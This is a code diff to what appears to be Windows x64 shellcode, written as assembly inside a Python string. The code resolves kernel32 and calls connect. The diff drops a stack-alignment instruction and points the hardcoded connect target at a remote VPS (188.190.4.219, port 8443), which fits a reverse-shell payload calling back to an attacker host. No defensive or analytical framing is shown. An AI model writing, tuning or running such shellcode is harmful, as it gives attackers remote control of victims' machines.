@@ -11,7 +11,6 @@ CODE = (
 '''
 start:
     mov rbp, rsp
-    and rsp, 0xfffffffffffffff0         # Align check
     sub rsp, 1600
 
 resolve_kernel32:
@@ -184,7 +183,7 @@ call_connect:
     # }
     # LAN: 0x4201A8C0FB200002
     # VPS: 0xdb04beb4fb200002
-    mov r9, 0xdb04beb4fb200002          # R9 = IP AND PORT 
+    mov r9, 0xdb04bebcfb200002          # R9 = [IP = 188.190.4.219 | port = 8443 | AF_INET = 2]
     lea rdx, [rsp + 800]                # RDX = Parameter name = Address of struct sockaddr_in
     mov [rdx], r9                       # Write fields: sin_addr, sin_port, sin_family
     xor r9, r9
